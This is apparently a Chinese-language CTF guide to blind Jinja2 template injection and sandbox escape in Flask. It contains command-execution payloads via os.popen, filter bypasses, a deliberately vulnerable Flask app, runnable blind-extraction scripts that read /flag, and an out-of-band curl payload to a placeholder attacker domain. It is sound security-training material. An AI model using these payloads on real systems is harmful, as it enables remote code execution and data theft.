---
title: SSTI 进阶：无回显盲注探测与 Jinja2 沙箱逃逸完整链
category: web
tags: [ssti, jinja2, blind, sandbox-escape, flask]
signals:
  - "提交 {{7*7}} 没有 49 回显，但页面响应正常返回"
  - "输入 {{1/0}} 返回 500，正常输入返回 200"
  - "模板只在邮件 / PDF / 日志里渲染，前端看不到结果"
  - "报错页出现 TemplateRuntimeError 或 UndefinedError"
  - "题面出现 Flask 与 render_template_string 字样"
  - "过滤了 {{ }} 双花括号，只剩 {% %} 可用"
  - "过滤了下划线 _，导致 __class__ 写入即被拦"
  - "题面提示词出现 盲注 / 无回显 / blind / oracle"
  - "存在发送邮件、生成图片、写日志这类间接输出功能"
difficulty: hard
source: "PortSwigger / onsecurity / HackTricks"
tools: [python, burpsuite, requests]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 提交 `{{7*7}}` **没有 `49` 回显**，但页面正常返回；说明模板确实被渲染了，只是输出被丢弃。
- 输入 `{{1/0}}` → HTTP 500 或页面内容变化；输入 `{{7*7}}` → 200。**状态码差异即 oracle**。
- 需要"发邮件通知"、"导出 PDF"、"给管理员发站内信"的功能，模板在异步 worker 里渲染。
- 报错页出现 `jinja2.exceptions.TemplateRuntimeError`、`UndefinedError: 'x' is undefined`。
- 题面提示：`盲打`、`无回显`、`blind`、`oracle`、`模板注入`、`payload 被过滤了`。
- 过滤了 `{{`、`}}`、`_`、`os`、`config`、`.` 中的若干：需用 `{% ... %}`、`|attr`、`request.args` 绕。
- 已经确认能命令执行但 flag 在 `/flag`，存在 `os` 关键字过滤 → 需走完整沙箱逃逸链。

## 二、原理

### 1. 为什么没有回显

```python
render_template_string(user_input)   # 结果被 return 了 → 回显
render_template_string(user_input);  # 结果没有 return → 无回显，但仍会执行
```

只要模板被**传入渲染函数**，表达式就会求值。副作用（抛异常、sleep、DNS 请求）就成了旁路通道。

### 2. 三类 Blind SSTI 通道

| 通道 | 原理 | 适用场景 |
|---|---|---|
| **错误型（Error Based）** | 条件成立时故意 `1/0`、`raise`、`int("x")` 令页面 500 | 最简单，只要能把 500 和 200 分开 |
| **时间型（Time Based）** | 条件成立时 `time.sleep(5)`，看响应延迟 | 状态码全被吞、返回统一错误页 |
| **带外（OOB）** | 条件成立时发 DNS/HTTP 请求到我们的服务器 | 完全无响应差异时最可靠 |

### 3. Jinja2 沙箱逃逸的核心路径

Jinja2 在沙箱里（`SandboxedEnvironment`）限制了下划线属性访问，但逃逸路径本质是"找一个能触达 Python 内建的对象"：

```
''.__class__            -> str
    .__mro__[1]         -> object
    .__subclasses__()   -> 所有已加载类
        -> 找到 <class 'os._wrap_close'> 或 subprocess.Popen
    .__init__.__globals__['popen']('id').read()
```

沙箱会拦截 `__` 开头的属性，所以用过滤器绕：

| 被拦 | 绕过 | 说明 |
|---|---|---|
| `.` | `|attr('__class__')` | 属性访问走 filter |
| `__` | `|attr("\x5f\x5fclass\x5f\x5f")` | 十六进制/转义拼字符串 |
| `__` | `|attr(request.args.a)` | 把串从 query 传入 |
| `{{ }}` | `{% print(7*7) %}` | 用语句块输出 |
| `_` | `{{ 'a'\|attr('__cl'+'ass__') }}` | 字符串拼接 |

`cycler`、`joiner`、`namespace`、`lipsum` 是 Flask 预置在模板全局里的对象，可以直接当成跳板：`{{ lipsum.__globals__['os'].popen('id').read() }}`。

## 三、解题步骤

1. **分通道确认**：先打 `{{7*7}}`（回显？）、`{{1/0}}`（500？）、`{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}`（延迟？）。
2. **选通道**：200/500 可区分 → 错误型；否则时间型；都不行 → OOB。
3. **构造条件表达式**：`{% if <cond> %}{{1/0}}{% endif %}`，cond 为逐字比较 `'/flag'[0]=='f'`。
4. **二分/逐字爆破**：flag 字符集 `[a-z0-9_{}-]`，每个字符一次请求。
5. **拿全 flag**：`open('/flag').read()`，逐字节 `[i]` 或切片比较。
6. **绕过过滤**：对照上面的表逐个替换；`request.args` 把 payload 分片传入，模板里只做 `~` 拼接。

## 四、可直接运行的脚本

题目复现（无回显版）：

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get("name", "")
    if "{{" in name or "}}" in name:
        return "bad", 403
    render_template_string(name)      # ← 渲染了，但没 return 结果
    return "ok"

app.run(port=5000)
```

盲注探测脚本（错误型 oracle）：

```python
import requests, string

URL = "http://TARGET/"
CHARS = string.ascii_lowercase + string.digits + "_{}-"

def oracle(cond):
    """cond 为 Jinja2 表达式字符串；返回 True 表示条件成立（触发 500）"""
    payload = "{%% if %s %%}{{1/0}}{%% endif %%}" % cond
    r = requests.get(URL, params={"name": payload}, timeout=15)
    return r.status_code == 500

def brute(expr, idx, target=40):
    """expr 形如 open('/flag')，逐字读第 idx 个字符"""
    for c in CHARS:
        if oracle("%s[%d]=='%s'" % (expr, idx, c)):
            return c
    return None

flag = ""
for i in range(64):
    c = brute("open('/flag').read()", i)
    if not c:
        break
    flag += c
    print(flag)
```

时间型 oracle（状态码被统一时）：

```python
import time, requests

def oracle_time(cond, delay=4):
    payload = ("{%% if %s %%}"
               "{{cycler.__init__.__globals__.os.popen('sleep %d').read()}}"
               "{%% endif %%}") % (cond, delay)
    t = time.time()
    requests.get("http://TARGET/", params={"name": payload}, timeout=30)
    return time.time() - t > delay * 0.8
```

带外（OOB）通道：条件成立时 DNS 解析我们的域名。

```jinja2
{% if open('/flag').read()[0]=='f' %}
{{ lipsum.__globals__['os'].popen("curl http://OUR-DNS.TARGET/x").read() }}
{% endif %}
```

## 五、常见坑 / 变体

- **`{% if %}` 也被过滤**：用 `{{1 if cond else 0}}` 配合 `1/0`：`{{(1/0) if cond else 0}}`。
- **`os` 被 ban**：`lipsum.__globals__['__bui'+'ltins__']['eval']("...")`，或 `__import__('os')`。
- **`open` 被 ban**：`''.__class__.__mro__[1].__subclasses__()` 里找 `_io.FileIO` 或 `_frozen_importlib.BuiltinImporter`。
- **`request` 对象不可用**（非 Flask）：改用 `{{self}}`、`{{config}}`、`{{url_for.__globals__}}`。
- **错误型被吞**（有全局 500 处理返回 same page）：改时间型，注意 `sleep` 也要用 `os.popen('sleep 5')`，别用 `time.sleep`。
- **响应被缓存**：给 payload 加随机 query，避免 CDN 缓存化。
- **变体：模板只渲染一次**（写信后管理员后台渲染）→ 把 flag 外带到自己的服务器。
- **变体：Jinja2 3.x 的 `|attr` 仍可用**，但 `__subclasses__` 结果索引因进程而变，**永远先打印一次**再硬编码索引。
- **变体：Twig/PHP 无回显** → `{% if cond %}{{ ['x']|filter('system') }}{% endif %}` 同理。
- **同一 flag 多字节**：逐字爆破 64 次够；更长就二分比较 `open('/flag').read()[:n] < 'xxxx'`。

## 六、参考来源

- [Server Side Template Injection with Jinja2 — onsecurity.io](https://jinja.palletsprojects.com/en/stable/templates/)
- [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Jinja2 官方文档 — Sandbox](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [CVE-2025-23211 Tandoor Recipes Jinja2 SSTI 分析](https://www.offsec.com/blog/cve-2025-23211/)
